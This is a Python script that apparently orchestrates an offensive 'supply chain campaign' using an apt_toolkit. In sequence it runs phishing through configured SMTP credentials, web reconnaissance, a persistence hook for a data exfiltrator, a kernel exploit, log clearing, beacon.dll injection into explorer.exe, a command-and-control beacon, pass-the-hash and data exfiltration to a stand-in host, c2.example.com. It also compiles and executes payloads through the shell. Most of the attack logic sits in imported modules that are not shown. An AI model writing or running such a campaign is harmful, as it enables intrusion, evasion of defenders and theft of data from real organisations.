import os
import sys
import subprocess
import json

# Add apt_toolkit to the Python path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..')))

from apt_toolkit import initial_access
from apt_toolkit import persistence
from apt_toolkit import privilege_escalation
from apt_toolkit import defense_evasion
from apt_toolkit import command_control
from apt_toolkit import exfiltration
from apt_toolkit import lateral_movement

def run_tool(tool_name, args=""):
    """Runs a tool from the campaign's tools directory."""
    tool_path = os.path.join(os.path.dirname(__file__), "tools", tool_name)
    if not os.path.exists(tool_path):
        # If tool is not in campaign's tool directory, try root tools directory
        tool_path = os.path.join(os.path.dirname(__file__), "..", "..", "tools", tool_name)

    if not os.path.exists(tool_path):
        # If tool is not in campaign's tool directory, try payloads directory
        tool_path = os.path.join(os.path.dirname(__file__), "payloads", tool_name)

    if not os.path.exists(tool_path):
        print(f"[-] Tool {tool_name} not found.")
        return

    if tool_path.endswith(".c"):
        # Compile C code
        output_path = tool_path.replace(".c", "")
        compile_command = f"gcc {tool_path} -o {output_path}"
        print(f"[*] Compiling C code: {compile_command}...")
        try:
            subprocess.run(compile_command, shell=True, check=True)
            tool_path = output_path
        except subprocess.CalledProcessError as e:
            print(f"[-] Error compiling C code: {e}")
            return
        except FileNotFoundError:
            print(f"[-] gcc not found. Please install gcc.")
            return

    print(f"[*] Running tool: {tool_path} {args}...")
    try:
        subprocess.run(f"{tool_path} {args}", shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[-] Error running tool {tool_name}: {e}")
    except FileNotFoundError:
        print(f"[-] Tool {tool_name} not found at {tool_path}")


def main():
    with open("config.json") as f:
        config = json.load(f)
    """
    Main function to run the supply_chain_campaign campaign.
    """
    print(f"[*] Starting supply_chain_campaign campaign...")

    # 1. Initial Access
    print("[*] Phase 1: Initial Access")
    smtp_config = {
        "server": config.get("smtp_server"),
        "port": config.get("smtp_port"),
        "user": config.get("smtp_user"),
        "password": config.get("smtp_password"),
    }
    initial_access.phishing_attack("supply_chain_management_systems_employees.txt", smtp_config)
    run_tool("apt_web_recon.js", "--target supply_chain_management_systems.com")


    # 2. Persistence
    print("\n[*] Phase 2: Persistence")
    persistence.add_startup_script("payloads/data_exfiltrator.py")


    # 3. Privilege Escalation
    print("\n[*] Phase 3: Privilege Escalation")
    privilege_escalation.exploit_kernel_vulnerability()


    # 4. Defense Evasion
    print("\n[*] Phase 4: Defense Evasion")
    defense_evasion.clear_logs()
    run_tool("apt_memory_injector.py", "--process explorer.exe --payload payloads/beacon.dll")


    # 5. Command and Control
    print("\n[*] Phase 5: Command and Control")
    c2_server = command_control.start_c2_server()
    command_control.send_beacon(c2_server, "VICTIM-SUPPLY_CHAIN_MANAGEMENT_SYSTEMS-01")


    # 6. Lateral Movement
    print("\n[*] Phase 6: Lateral Movement")
    lateral_movement.pass_the_hash("admin", "hash123")


    # 7. Exfiltration
    print("\n[*] Phase 7: Exfiltration")
    exfiltration.exfiltrate_data("data/data.zip", "https://c2.example.com/upload")
    run_tool("payloads/data_exfiltrator.py")


    print("\n[*] Campaign finished.")


if __name__ == "__main__":
    main()